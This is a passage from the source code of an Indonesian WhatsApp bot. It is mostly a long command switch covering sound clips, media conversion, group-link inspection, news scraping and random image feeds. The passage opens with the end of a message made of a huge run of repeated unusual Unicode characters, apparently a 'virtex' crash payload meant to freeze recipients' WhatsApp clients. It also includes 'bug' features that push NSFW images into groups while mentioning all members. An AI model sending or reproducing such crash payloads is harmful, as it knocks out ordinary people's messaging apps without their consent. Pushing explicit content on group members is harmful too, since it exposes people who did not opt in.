𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦` }, { quoted: doc })
}
break
case 'bugsange': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!isBotAdmins) return anjay(mess.botAdmin)
if (!isAdmins && !isCreator) return anjay(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return anjay('Sudah Aktif')
ntnsfww.push(from)
anjay('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
} else if (args[0] === "off") {
if (!AntiNsfww) return anjay('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
anjay('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(m.chat, anuala, `HW MODS WA${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!AntiNsfww) return anjay(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© Hay Kak ${pushname} 👋 Kamu Sange Yah`,
} 
haikal.sendMessage(m.chat, bugcrot, { quoted: doc }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return anjay(mess.group)
if (!AntiNsfww) return anjay(mess.nsfw)
anjay(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© Hay Kak ${pushname} 👋 Kamu Sange Yah`,
} 
haikal.sendMessage(m.chat, bugahay, { quoted: doc }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
//=================================================//
case 'hu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mem = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'hi': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ha': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'he': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ba': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 ah = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'be': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 eh = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return

 ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bi': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) return

 nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ca': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ci': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 ru = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 re = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'co': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
//=================================================//
//=================================================//
case 'inspect': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) return anjay("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return anjay("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Inspector 」
▸ ID : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}
▸ Subject : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ Subject update by : ${res.content[0].attrs.s_o.split("@")[0] ? "@" + res.content[0].attrs.s_o.split("@")[0] : "undefined"}
▸ Subject update at : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Create by : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Create at : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Members : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Members
▸ Desc update by : ${res.content[0].content[0].attrs.participant ? "@" + res.content[0].content[0].attrs.participant.split("@")[0] : "undefined"}
▸ Desc update at : ${res.content[0].content[0].attrs.t ? moment(res.content[0].content[0].attrs.t * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Desc id : ${res.content[0].content[0].attrs.id ? res.content[0].content[0].attrs.id : "undefined"}
▸ Description : ${res.content[0].content[0].content[0].content ? res.content[0].content[0].content[0].content.toString() : "No Description"}
`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
})
}
break
//=================================================//
case 'asupan':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/random`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:hw})
break
//=================================================//
case 'asupanukhty':
case 'asupan-ukhty':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/ukhty`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:hw})
break
//=================================================//
case 'asupan-santuy':
case 'asupansantuy':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/santuy`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:hw})
break
//=================================================//
case 'hijaber':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/hijaber`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-indo':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/indonesia`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-malaysia':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/malaysia`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-thai':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/thailand`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-vietnam':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/vietnam`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-korea':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/korea`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan-jepan':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/japan`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'cecan':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/cecan`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:hw})
break
//=================================================//
case 'ban': case 'banned': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) return anjay(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return anjay('*User has been banned*')
banned.push(orgnye)
anjay(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return anjay('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
anjay(`*Success Removing Banned Users*`)
} else {
anjay("Error")
}
}
break
//=================================================//
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
anjay(res)
});
break
//=================================================//
case 'kal': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 hey = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 hoy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 huy = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mi = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 miki = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mo = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 mu = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'slebew': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 me = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 muku = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 meke = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 moko = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: hw })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: hw })
}
}
break
//=================================================//
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args.join(" ")) return anjay("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
anjay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
//=================================================//
case 'bully': case 'waifu': case 'cuddle': case 'neko': case 'cry': case 'kiss': case 'hug': case 'awoo': case 'lick': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let anu = await getBuffer(`https://yx-api.herokuapp.com/api/sfw/${command}`)
haikal.sendMessage(m.chat, { image: anu, caption: `NihKak` }, { quoted:hw})
}
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
//=================================================//
//=================================================//
case 'darkjoke':{
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted:hw}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme':{
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted:hw}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'meme2':{
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted:hw}).catch((err) => anjay('Maaf server Xteam sedang down'))
}
break
//=================================================//
case 'ss': case 'ssweb': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return anjay(mess.endLimit)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:hw }).catch((err) => anjay(jsonformat('*error*')))
}
break
//=================================================//
case 'fajar-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//=================================================//
case "quotes":
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
anjay(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var res = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
case 'cnn-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
anjay(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!q) return anjay('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
anjay(teks) 
})
break
//=================================================//
case 'cnbc-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'tribun-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'indozone-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'kompas-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'detik-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'daily-news':
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
